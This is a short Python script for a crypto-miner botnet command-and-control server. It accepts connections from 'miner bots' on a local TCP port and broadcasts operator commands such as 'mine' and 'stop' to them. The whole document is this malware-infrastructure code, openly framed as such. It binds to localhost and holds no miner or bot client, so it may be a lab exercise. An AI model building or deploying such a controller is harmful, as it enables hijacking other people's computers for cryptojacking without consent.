#!/usr/bin/env python3
import socket
import threading

bots = []

def handle_new_bots(server):
    while True:
        bot, addr = server.accept()
        print(f"[C2] Miner bot connected from {addr}")
        bots.append(bot)

def broadcast(cmd):
    for bot in bots:
        try:
            bot.send(cmd.encode())
        except:
            bots.remove(bot)

def start_miner_c2():
    HOST = '127.0.0.1'
    PORT = 7777

    print(f"[C2 ⛏️] Starting Crypto Miner C2 on {HOST}:{PORT}")
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(5)

    threading.Thread(target=handle_new_bots, args=(server,), daemon=True).start()

    while True:
        cmd = input("C2 > Send command (mine / stop / exit): ").strip()
        if cmd.lower() == "exit":
            print("[C2] Shutting down...")
            break
        broadcast(cmd)

if __name__ == "__main__":
    start_miner_c2()
